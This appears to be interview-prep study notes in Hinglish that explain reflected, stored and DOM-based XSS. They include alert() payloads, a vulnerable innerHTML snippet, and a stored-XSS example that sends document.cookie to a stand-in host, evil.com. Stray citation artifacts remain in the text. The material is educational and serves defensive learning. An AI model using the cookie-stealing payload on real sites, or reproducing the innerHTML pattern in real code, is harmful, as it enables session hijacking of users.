## Cross Site Scripting ( XSS ) Vulnerability Payload List
## 🔍 Overview :

**Cross‑Site Scripting (XSS)** attacks ek tarah ka injection attack hai, jisme attacker malicious scripts ko inject karke ek benign aur trusted website ko compromise kar leta hai. XSS tab hota hai jab attacker web application ka use karke malicious code (mostly browser-side JavaScript) dusre end user ke browser tak bhej deta hai. Ye vulnerability tab exploit hoti hai jab web app user ka input bina validation ya encoding ke output me use kar deti hai—aur ye flaw kaafi common hai. :contentReference[oaicite:0]{index=0}

Attack ka mechanism kuch is tarah ka hai:  
- Attacker XSS ke zariye khatarnaak script bhejta hai unsuspecting user ke browser me.  
- Browser is script ko trusted source (web app) se aane wale code ki tarah samajh leta hai, aur execute kar deta hai.  
- Script browser me store cookies, session tokens, ya sensitive information access kar sakta hai.  
- Ye script HTML page ka content bhi modify (rewrite) kar sakta hai. :contentReference[oaicite:1]{index=1}

# Types of Cross‑Site Scripting (XSS)

## 1. Reflected XSS (Non‑Persistent)  
- **Description:** Server user input ko turant response mein bina sanitize kiye reflect karta hai.  
- **Example:**  
               https://example.com/search?term=<script>alert('XSS')</script>
  Browser is script ko trusted source se samajh ke execute kar deta hai :contentReference[oaicite:0]{index=0}.  
- **Interview mein bolna:**  
“Reflected XSS tab hota hai jab input URL ya form se server tak jaata hai aur response me turant HTML context me reflect hota hai, jisse user click karte hi script run ho jaata hai.”

---

## 2. Stored XSS (Persistent)  
- **Description:** Attacker script database ya kisi stored field (comment/post) mein permanently save kar deta hai.  
- **Example:**  
User ne comment mein `<script>fetch('https://evil.com?c='+document.cookie)</script>` inject kiya, aur jab koi page access karta hai, script execute ho jaata hai :contentReference[oaicite:1]{index=1}.  
- **Interview mein bolna:**  
“Ye sabse khatarnaak hota hai kyunki payload stored rehta hai aur har visitor ke browser mein execute ho sakta hai—session hijack, defacement, phishing sab possible hai.”

---

## 3. DOM‑Based XSS  
- **Description:** Pure client-side hota hai. JavaScript DOM methods (e.g., `innerHTML`) user input ko unsafe tarike se content me inject kar dete hain.  
- **Example:**  
         const name = new URLSearchParams(window.location.search).get('name');
           document.getElementById('greet').innerHTML = name;

Agar URL ho ?name=<img src=x onerror=alert('XSS')>, toh browser me alert box show hoga

- **Interview mein bolna:**  
“Yahaan server safe hai, lekin client-side JS vulnerability hai—data sanitization miss, DOM me inject.”

